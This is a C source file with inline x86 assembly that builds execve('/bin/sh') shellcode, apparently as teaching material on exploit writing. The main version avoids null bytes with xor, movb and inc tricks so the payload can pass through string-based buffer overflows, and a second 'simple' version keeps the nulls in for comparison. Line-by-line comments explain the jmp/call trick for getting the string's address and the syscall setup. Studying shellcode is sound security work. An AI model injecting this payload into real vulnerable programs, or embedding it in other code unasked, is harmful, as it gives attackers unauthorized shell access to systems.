void main() {
__asm__(
	// PREPARE DATA
	"jmp    label_binsh              \n\t"	// jmp to the call instruction at the end
	"label_back:                     \n\t"
	"popl   %esi                     \n\t"	// read the address of /bin/sh

	"xorl   %eax,%eax                \n\t"	// avoid 0 bytes, use %eax instead
	"movb   %al,0x7(%esi)            \n\t"	// manually 0-terminate the string (we don't want 0s in the shellcode)
	"movl   %esi,0x8(%esi)           \n\t"	// write the address of /bin/sh right after the string itself
	"movl   %eax,0xc(%esi)           \n\t"	// after the address, write 0

	// CALL execve
	"movb   $0xb,%al                \n\t"	// EAX <- 0xb (code of execve syscall). Same as movl $0xb %eax, but avoids 0s!
	"movl   %esi,%ebx                \n\t"	// EBX <- char* = "/bin/sh"
	"leal   0x8(%esi),%ecx           \n\t"	// ECX <- char*[2] = { "/bin/sh", NULL }
	"xorl   %edx,%edx                \n\t"	// EDX <- NULL
	"int    $0x80                    \n\t"	// syscall (*%gs:0x10 causes \0's)

	// CALL exit
	"xorl   %eax,%eax                \n\t"
	"inc    %eax                     \n\t"	// EAX <- 0x1 but without 0 bytes
	"xorl   %ebx, %ebx               \n\t"	// EBX <- 0x0	(exit code)
	"int    $0x80                    \n\t"	// syscall (*%gs:0x10 causes \0's)

	// jmp here to get back the address of /bin/sh
	"label_binsh:                    \n\t"
	"call label_back                 \n\t"	// jump back after pushing EIP
	".string \"/bin/sh\"             \n\t"	// 7 bytes
);
}

// Simple version, which however produces 0s in the code!

void main_simple() {
__asm__(
	// PREPARE DATA
	"jmp    label_binsh2             \n\t"	// jmp to the call instruction at the end
	"label_back2:                    \n\t"
	"popl   %esi                     \n\t"	// read the address of /bin/sh

	"movb   $0x0,0x7(%esi)           \n\t"	// manually 0-terminate the string
	"movl   %esi,0x8(%esi)           \n\t"	// write the address of /bin/sh right after the string itself
	"movl   $0x0,0xc(%esi)           \n\t"	// after the address, write 0

	// CALL execve
	"movl   $0xb,%eax                \n\t"	// EAX <- 0xb (code of execve syscall)
	"movl   %esi,%ebx                \n\t"	// EBX <- char* = "/bin/sh"
	"leal   0x8(%esi),%ecx           \n\t"	// ECX <- char*[2] = { "/bin/sh", NULL }
	"movl   $0x0,%edx                \n\t"	// EDX <- NULL
	"call *%gs:0x10                  \n\t"	// syscall

	// CALL exit
	"movl   $0x1,%eax               \n\t"
	"movl   $0x0,%ebx               \n\t"
	"call *%gs:0x10                 \n\t"	// syscall

	// jmp here to get back the address of /bin/sh
	"label_binsh2:                  \n\t"
	"call label_back2               \n\t"	// jump back after pushing EIP
	".string \"/bin/sh\"            \n\t"	// 7 bytes
);
}